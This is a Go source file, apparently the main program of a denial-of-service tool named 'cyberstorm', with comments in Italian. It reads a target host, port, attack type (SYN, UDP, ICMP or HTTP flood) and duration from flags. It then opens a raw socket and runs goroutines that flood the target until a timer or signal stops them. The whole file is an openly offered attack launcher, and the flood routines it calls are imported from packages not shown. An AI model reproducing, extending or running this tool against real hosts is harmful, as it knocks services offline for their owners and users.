package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"cyberstorm/attacks"
	"cyberstorm/core"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	core.PrintRandomPhrase()

	host := flag.String("host", "", "destination IP or URL")
	port := flag.Int("port", 0, "destination port")
	attack := flag.String("attack", "syn-flood", "type of attack (syn-flood, udp-flood, icmp-flood, http-flood)")
	duration := flag.Int("duration", 30, "duration of the attack in seconds")
	flag.Parse()

	if *host == "" || (*attack != "http-flood" && *port == 0) {
		fmt.Println("Usage: -host <ip or URL> -port <port> -attack <syn-flood|udp-flood|icmp-flood|http-flood> -duration <seconds>")
		os.Exit(1)
	}

	dstIp := net.ParseIP(*host)
	dstPort := uint16(*port)
	log.Printf("starting %s against %s:%d for %d seconds", *attack, *host, dstPort, *duration)

	rawSocket, err := core.NewRawSocket(dstIp)
	if err != nil {
		log.Fatalf("new raw socket: %v", err)
	}
	defer rawSocket.Close() // Assicurati che il socket venga chiuso

	wg := &sync.WaitGroup{}
	ctx, cancelFunc := context.WithCancel(context.Background())

	for i := 0; i < 2; i++ {
		wg.Add(1)
		go Run(wg, ctx, rawSocket, dstIp, dstPort, *attack, *duration, *host)
		log.Printf("started go routine %d", i)
	}

	log.Println("press ^C to stop")

	// Gestione del segnale di terminazione
	termChan := make(chan os.Signal, 1)
	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-termChan:
		log.Println("received termination signal")
		cancelFunc() // Ferma tutte le goroutine
		wg.Wait()    // Attendi che tutte le goroutine terminino
	case <-time.After(time.Duration(*duration) * time.Second):
		log.Printf("Attack finished after %d seconds\n", *duration)
		cancelFunc() // Ferma tutte le goroutine
		wg.Wait()    // Attendi che tutte le goroutine terminino
	}

	log.Println("done")
}

func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket core.RawSocket, dstIp net.IP, dstPort uint16, attack string, duration int, host string) {
	defer wg.Done() // Assicuriamoci che wg.Done() venga chiamato alla fine della funzione
	attack = strings.ToLower(strings.TrimSpace(attack))

	for {
		select {
		case <-ctx.Done():
			log.Println("canceling attack")
			return
		default:
			var err error
			switch attack {
			case "syn-flood":
				err = attacks.SendSYN(rawSocket, dstIp, dstPort)
			case "udp-flood":
				err = attacks.SendUDP(rawSocket, dstIp, dstPort)
			case "icmp-flood":
				err = attacks.SendICMP(rawSocket, dstIp)
			case "http-flood":
				go attacks.RunHTTPFlood(host, time.Duration(duration)*time.Second)
			default:
				log.Fatalf("unsupported attack: %s", attack)
			}

			if err != nil {
				log.Printf("send %s: %v", attack, err)
			}
		}
	}
}
